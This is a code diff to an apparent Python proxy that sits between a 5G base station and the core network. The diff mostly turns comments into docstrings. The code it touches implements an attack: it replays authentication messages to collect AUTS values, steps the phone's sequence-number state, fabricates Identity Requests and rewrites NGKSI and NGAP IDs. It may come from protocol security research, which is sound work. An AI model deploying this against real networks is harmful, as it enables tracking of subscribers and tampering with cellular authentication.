@@ -138,6 +138,7 @@ def get_auts(nas_bytes: bytes) -> bytes | None:
         return None
 
 def record_auts(ran_ue_id: int, auts: bytes, j: int, delta: int | None, baseline_hex: str | None):
+    """ Records the collected AUTS and extracted fields"""
     entry = {
         "ran_ue_ngap_id": ran_ue_id,
         "j":              j,
@@ -156,8 +157,9 @@ def record_auts(ran_ue_id: int, auts: bytes, j: int, delta: int | None, baseline
     print(f"Recorded AUTS j={j}: {entry}")
 
 
-# Prevent NGKSI Already in use error by increasing the ID by one every baseline repeat
+# Prevent(NGKSI Already in use) error by increasing the ID by one every baseline repeat
 def increase_ngksi(nas_bytes: bytes) -> bytes | None:
+    """ Increment NAS NGKSI id within a modulo range """
     try:
         msg, err = parse_NAS5G(nas_bytes)
         if err or msg is None:
@@ -174,6 +176,7 @@ def increase_ngksi(nas_bytes: bytes) -> bytes | None:
         return None
 
 def increase_ngksi_in_ngap_bytes(ngap_bytes: bytes):
+    """ Increment NAS NGKSI id within a modulo range for a whole PDU """
     try:
         pdu = decode_ngap(ngap_bytes)
         if pdu is None:
@@ -270,8 +273,10 @@ def set_amf_ue_ngap_id(pdu, new_amf_ue_id: int) -> bytes | None:
         return None
     
 
-# Fabricated Identity Request from Proxy to UE.
+
 def create_identity_request_ngap(ran_ue_id: int, amf_ue_id: int):
+    """ Fabricated Identity Request from Proxy to UE. """
+    
     # NAS 5GMM Identity Request
     nas_payload = bytes([0x7e, 0x00, 0x5b, 0x01])
     pdu = NGAP_PDU()
@@ -296,6 +301,8 @@ _state_lock = Lock()
 
 
 def init_attack_state(ran_ue_id: int):
+    "Initiates the attack state per UE"
+
     with _state_lock:
         _attack_state[ran_ue_id] = {
             "phase":      "setup", # "setup" | "idle" | "await_baseline" | "baseline_done" | "await_accept" | "await_sync" | "await_identity_resp"
@@ -306,7 +313,7 @@ def init_attack_state(ran_ue_id: int):
             "auth_vectors": [],  # raw NGAP downlink NAS frames, index i = vector i
             "edit_baseline": None, # raw NGAP uplink NAS frame with diff NGKSI
             "amf-id":0, # Needed to not get ErrorIndication since UE and AMF is out of sync
-            "_pending_phase": None, # next phase after "await_identity_resp"
+            "pending_phase": None, # next phase after "await_identity_resp"
         }
 
 def get_state(ran_ue_id: int) -> dict | None:
@@ -322,8 +329,9 @@ def set_phase(ran_ue_id: int, phase: str, **kwargs):
 
 
 
-# Replay baseline to get the AUTS using the same AK
+
 def send_r0(gnb_sock, ran_ue_id: int, next_phase: str, label: str = "R0,AUTN0"):
+    """ Replay baseline to get the AUTS using the same AK """
     state = get_state(ran_ue_id)
     if not state or not state["edit_baseline"]:
         print(f"ERROR - no auth vectors stored for RAN-UE: {ran_ue_id}")
@@ -335,8 +343,9 @@ def send_r0(gnb_sock, ran_ue_id: int, next_phase: str, label: str = "R0,AUTN0"):
 
 
 
-# Sends the auth request to get Auth response, changing the UE SQN state
+
 def send_auth_vector(gnb_sock, ran_ue_id: int):
+    """ Sends the auth request to get Auth response, changing the UE SQN state """
     state = get_state(ran_ue_id)
     j     = state["j"]
     idx   = 2 ** j
@@ -402,7 +411,7 @@ def uplink(gnb_sock, amf_sock):
                     # UE anwswer to Identity Request, meaning context is reset
                     if msg_type == NAS_IDENTITY_RESPONSE:
                         if state["phase"] == "await_identity_resp":
-                            pending = state.get("_pending_phase", "await_baseline_sync")
+                            pending = state.get("pending_phase", "await_baseline_sync")
                             print(f"Identity Response — resending R0 to resume phase={pending}")
 
                             # Forward Identity Requst to AMF
@@ -462,7 +471,7 @@ def uplink(gnb_sock, amf_sock):
                         if failure_cause == CAUSE_NGKSI_IN_USE:
                             print(f"NGKSI in use — sending Identity Request to reset")
                             set_phase(ran_ue_id, "await_identity_resp",
-                                    _pending_phase=state["phase"])
+                                    pending_phase=state["phase"])
                             
                             # Create and Send Identity Request to UE
                             pdu_ir = create_identity_request_ngap(ran_ue_id, state["amf-id"])
@@ -591,6 +600,7 @@ def downlink(gnb_sock, amf_sock):
            
 # Connection handler
 def handle(gnb_sctp):
+    """ Creating connection threads and forwarding towards AMF """
     print(f"gNB connected — opening AMF {AMF_IP}:{AMF_PORT}")
     amf_sctp = sctp.sctpsocket_tcp(socket.AF_INET)
 
